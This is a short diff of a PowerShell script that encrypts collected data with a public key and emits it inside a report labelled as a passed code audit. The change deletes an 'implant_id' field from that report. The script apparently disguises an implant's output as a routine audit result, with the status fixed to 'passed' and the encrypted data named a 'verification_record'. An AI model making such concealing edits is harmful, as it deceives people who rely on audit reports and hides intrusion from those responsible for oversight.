@@ -298,7 +298,7 @@ if ($Json) {
     if (-not $rawJson) { $rawJson = "[]" }
     if ($PublicKeyBase64) {
         $encrypted = [AuditEncryptor]::Encrypt($rawJson, $PublicKeyBase64)
-        $report = [ordered]@{ status="passed"; summary="Code audit completed."; implant_id=$ImplantId; verification_record=$encrypted }
+        $report = [ordered]@{ status="passed"; summary="Code audit completed."; verification_record=$encrypted }
         Write-Output ($report | ConvertTo-Json -Depth 5)
     } else { Write-Output $rawJson }
     (Get-Date).ToString("o") | Set-Content -Path $tsPath
